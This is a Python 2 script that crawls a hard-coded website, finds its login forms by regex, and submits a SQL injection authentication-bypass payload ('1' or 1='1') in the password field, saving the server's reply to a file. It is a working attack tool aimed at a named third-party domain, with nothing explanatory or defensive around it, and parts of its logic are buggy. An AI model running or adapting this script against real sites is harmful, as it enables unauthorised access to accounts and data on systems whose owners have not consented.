import httplib
import sys
import re
import urllib2
import urlparse
import string
import urllib


if(len(sys.argv)<2):
	print "Usage <executable> <sublink> \n For example crawler.py /index.html."
	raise SystemExit

tocrawl = set([sys.argv[1]])
crawled = set([])
address = 'www.semsolutions.in'
subaddress = ''
linkregex = re.compile('<a\s*href=[\'|"](.*?)[\'"].*?>')
username1regex = re.compile('<input\s*name=[\'|"](.*?)[\'|"]\s*type=[\'|"]text[\'|"].*?>')
password1regex = re.compile('<input\s*name=[\'|"](.*?)[\'|"]\s*type=[\'|"]password[\'|"].*?>')
username2regex = re.compile('<input\s*type=[\'|"]text[\'|"]\s*name=[\'|"](.*?)[\'|"].*?>')
password2regex = re.compile('<input\s*type=[\'|"]password[\'|"]\s*name=[\'|"](.*?)[\'|"].*?>')

	
while 1:
	try:
		crawling = tocrawl.pop()
		print 'url is '+address+subaddress+crawling
	except KeyError:
		print 'End of task\n-------------------------'
		raise StopIteration
	conn = httplib.HTTPConnection(address)
	conn.request("GET",subaddress+crawling)
	res = conn.getresponse()
	print res.status, res.reason
#	print the title of the page
	url = urlparse.urlparse('address' + crawling)
	msg = res.read()
	startPos = msg.find('<title>')
	if startPos != -1:
		endPos = msg.find('</title>', startPos+7)
		if endPos != -1:
			title = msg[startPos+7:endPos]
			print 'Title of the page is -> ' + title

# Identify that the page has a form (currently works for only 1 form)
# Identify the method used in the form get or post

	startPos = msg.find('<form')
	if startPos != -1:
		print 'This page has a form'

		startPos = msg.find('method="')
		if startPos != -1:
			endPos = msg.find('"', startPos+8)
			if endPos != -1:
				method = msg[startPos+8:endPos]
				print 'Method of the form is ->' + method

# Identify the action used in the form

		startPos = msg.find('action="')
		if startPos != -1:
			endPos = msg.find('"', startPos+8)
			if endPos != -1:
				action = msg[startPos+8:endPos]
				print 'Action of the form is ->' + action
				print 'Doing SQL Injection'

#Identify the input parameters in the form using regex

		username = username1regex.findall(msg)+username2regex.findall(msg)
		password = password1regex.findall(msg)+password2regex.findall(msg)
		
		if(len(username)!=0 and len(password)!=0):

			username = username.pop()
			password = password.pop()
			print username
			print password

#SQL Injections go here
			conn = httplib.HTTPConnection(address)
			if method == 'get':
				conn.request("GET",subaddress+'/'+action+'?'+username+'=niks&'+password+'=niks')
			elif method == 'GET':
				conn.request("GET",subaddress+'/'+action+'?'+username+'=niks&'+password+'=niks')
			else:
				params = urllib.urlencode({'@'+username: 'nischayn22@gmail.com', '@'+password: '1\' or 1=\'1'})
				headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
				conn.request("post",subaddress+'/'+action,params,headers)
			res = conn.getresponse()
			print res.status, res.reason
			data = res.read()
			f = open('crawler.html', 'r+')
			f.write(data)


	#		print data+'----------------------'+'Injection done'
	




			
	links = linkregex.findall(msg)
	crawled.add(crawling)
	for link in (links.pop(0) for _ in xrange(len(links))):
		if link.startswith('http'):
			link = string.replace(link,'http://'+address+subaddress, '')
		elif link.startswith(address):
			link = string.replace(link, address+subaddress,'')
		elif not link.startswith('/'):
			link = '/' + link
		if link not in crawled:
			tocrawl.add(link)